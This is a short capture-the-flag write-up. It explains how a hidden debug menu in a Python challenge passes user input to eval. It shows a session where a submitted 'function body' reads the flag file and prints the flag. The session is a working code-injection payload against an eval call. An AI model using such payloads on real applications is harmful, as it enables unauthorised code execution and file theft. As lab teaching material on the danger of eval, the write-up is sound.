## Solution

This challenge is quite straightforward because participants have access to the source code. Upon reviewing it, you'll discover a hidden debug menu and notice that it uses the eval function. The goal is to input your own code into this eval call. Analyzing the code indicates that to achieve code execution, a player simply needs to submit a carefully crafted Python code snippet as a document.


```
Now what would you like to do ?
1. Query for a function
2. Exit
>> 1337
What would you like to do ?
1. Dump the chromadb
2. Add a collection
3. Add a document
4. Go back
>> 3
Enter the body of the function
>> open("/home/challenge/flag").read()
Enter the explanation of the function
>> ads
Using id as  func_96
Function added successfully and execution logs are as follows:
ictf{m1nd_y0ur_3v4l5_4nd_d0n'7_l37_u53r_c0d3_r34ch_3v4l}
```